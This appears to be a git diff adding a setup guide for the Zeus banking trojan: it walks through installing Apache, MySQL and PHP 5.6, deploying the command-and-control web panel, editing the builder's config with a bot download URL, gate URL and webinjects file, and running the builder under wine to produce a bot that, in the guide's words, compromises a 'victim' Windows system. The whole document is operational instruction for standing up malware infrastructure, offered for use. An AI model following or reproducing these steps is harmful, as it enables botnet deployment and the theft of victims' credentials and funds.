@@ -1,1 +1,78 @@
 This page contains the setup information
+#### i am suing ubuntu 18 , how ever it will also work in ubuntu 20 ####
+
+Installing Apache2
+
+$ sudo apt install apache2 -y
+
+Installing Mysql script. i,e already given .
+  
+$ sudo ./mysql.sh
+
+## after the script completed it will ask for current root password hit enter , then ask for to setup the root password for mysql select(n) also allow the network
+root login for mysql ,the rest in default // it is your choise what how you want to setup the mysql setup //
+## login to mysql
+
+$ sudo mysql ( if you followed above instruction ) otherwide $ sudo mysql -u root -p ( and enter password )
+
+Create database of any name , 
+mysql> create database zeus;
+mysql> exit;
+  
+Installing PHP 5.6
+
+$ sudo apt-get install python-software-properties
+$ sudo add-apt-repository ppa:ondrej/php
+$ sudo apt-get update
+$ sudo apt-get install -y php5.6 php5.6-mbstring
+
+#### environment is ready to go ####
+
+just copy the server folder to /var/www/html and give 755 as permission 
+
+$ sudo chmod -R 755 file_dir
+
+Now go to the URL 
+domainname.com/install/install.php
+
+fill the required fields and note it down .
+
+after installation, go to
+
+domainname.com/cp.php
+
+enter the username and password
+
+#####################################################
+#####################################################
+
+now time to create a payload by which victim system is going to compromise.
+
+go to builder foler open config.txt file make these changes . ( change the url to your domain name ) and save it .
+//
+entry "DynamicConfig"
+  url_loader "http://domainname.com/feel/bot.exe"
+  url_server "http://domainname.com/feel/gate.php"
+  file_webinjects "webinjects.txt"
+  entry "AdvancedConfigs"
+//
+
+######################################################
+######################################################
+
+Time to install wine 
+
+$ sudo apt install wine32 ( make sure it's wine32 that zeus zsb.exe is 32bit file and only work with 32bit system )
+
+after installation
+
+$ sudo wine32 zsb.exe ( you may got some error , simply install the packages it says missing or popup comes to install those packages simply install them )
+
+The setup in open now insert the ENC key you used to install zeus in web ( hope you note it down )
+
+next is to choose the config.txt file to choose . then press 2 button below them execute and build the bot something like that. you'll notice there are two file 
+config.bin and bot file in same directory !! 
+copy the config.bin and bot file to /var/www/html
+
+That bot file that is generated is payload , whenever it is executed in viction windows OS , The system become bot and in few minutes it is availabe in your
+control panel.
